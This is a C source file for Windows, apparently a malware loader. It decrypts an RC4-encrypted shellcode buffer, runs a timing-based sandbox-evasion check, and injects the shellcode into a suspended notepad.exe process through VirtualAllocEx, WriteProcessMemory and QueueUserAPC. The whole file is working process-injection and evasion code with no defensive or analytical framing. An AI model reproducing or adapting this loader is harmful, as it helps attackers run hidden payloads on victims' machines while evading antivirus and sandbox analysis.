#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

extern unsigned char buf;
extern unsigned int buf_len;

typedef struct
{
    unsigned int i;
    unsigned int j;
    unsigned char s[256];
} Rc4Context;

void rc4Init(Rc4Context* context, const unsigned char* key, size_t length) {
    unsigned int i;
    unsigned int j;
    unsigned char temp;

    if (context == NULL || key == NULL)
        return;

    context->i = 0;
    context->j = 0;

    for (i = 0; i < 256; i++) {
        context->s[i] = i;
    }

    for (i = 0, j = 0; i < 256; i++) {
        j = (j + context->s[i] + key[i % length]) % 256;

        temp = context->s[i];
        context->s[i] = context->s[j];
        context->s[j] = temp;
    }
}

void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
    unsigned char temp;

    unsigned int i = context->i;
    unsigned int j = context->j;
    unsigned char* s = context->s;

    while (length > 0) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        if (input != NULL && output != NULL) {
            *output = *input ^ s[(s[i] + s[j]) % 256];
            input++;
            output++;
        }

        length--;
    }

    context->i = i;
    context->j = j;
}

PBYTE CustomRC4EncryptDecrypt(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE pbKey, IN SIZE_T sKeySize) {
    Rc4Context RC4Ctx = { 0 };
    PBYTE pOtptBuffer = NULL;

    if (!pShellcode || !sShellcodeSize || !pbKey || !sKeySize)
        return NULL;

    pOtptBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sShellcodeSize);
    if (!pOtptBuffer) {
        printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
        return NULL;
    }

    RtlSecureZeroMemory(&RC4Ctx, sizeof(Rc4Context));
    rc4Init(&RC4Ctx, pbKey, sKeySize);
    rc4Cipher(&RC4Ctx, pShellcode, pOtptBuffer, sShellcodeSize);

    return pOtptBuffer;
}

// https://www.tutiorlspoint.com/c_standard_libary/c_function_clock.htm
int DelayFunction() {
    clock_t start_t, end_t;
    double total_t;
    int i = 8; // Change to the number of seconds for your delay. 10 would be a delay of 10 seconds. Default here is 6

    start_t = clock();
    printf("[i] Sleeping for %d seconds\n", i);
    Sleep(i * 1000); // Sleep counts in milliseconds, so need to convert from seconds to milliseconds (seconds * 1000)
    end_t = clock();
    printf("[i] Sleep ended: end_t = %ld cycles\n", end_t);

    if ((double)(end_t - start_t) / CLOCKS_PER_SEC < 4.5) {
        exit(0);
    }
    total_t = (double)(end_t - start_t) / CLOCKS_PER_SEC;
    printf("Total time taken by CPU: %f\n", total_t);

    return 0;
}

int main() {
    const char* key = "ntdll.dll";
    SIZE_T shellSize = buf_len;
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    // Simple sandbox evasion
    DelayFunction();

    // Create a suspended process
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[!] CreateProcessA failed with error: %d\n", GetLastError());
        return 1;
    }

    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;

    // Allocate memory in the target process
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!shellAddress) {
        printf("[!] VirtualAllocEx failed with error: %d\n", GetLastError());
        CloseHandle(victimProcess);
        CloseHandle(threadHandle);
        return 1;
    }

    // Encrypt/Decrypt the buffer using RC4
    PBYTE encryptedShellcode = CustomRC4EncryptDecrypt((PBYTE)&buf, buf_len, (PBYTE)key, strlen(key));
    if (!encryptedShellcode) {
        printf("[!] CustomRC4EncryptDecrypt failed.\n");
        CloseHandle(victimProcess);
        CloseHandle(threadHandle);
        return 1;
    }

    // Write the encrypted buffer into the target process's memory
    if (!WriteProcessMemory(victimProcess, shellAddress, encryptedShellcode, shellSize, NULL)) {
        printf("[!] WriteProcessMemory failed with error: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, encryptedShellcode);
        CloseHandle(victimProcess);
        CloseHandle(threadHandle);
        return 1;
    }

    // Queue the APC to execute the shellcode
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    if (!QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL)) {
        printf("[!] QueueUserAPC failed with error: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, encryptedShellcode);
        CloseHandle(victimProcess);
        CloseHandle(threadHandle);
        return 1;
    }

    // Resume the main thread of the process
    ResumeThread(threadHandle);

    // Cleanup
    HeapFree(GetProcessHeap(), 0, encryptedShellcode);
    CloseHandle(victimProcess);
    CloseHandle(threadHandle);

    return 0;
}
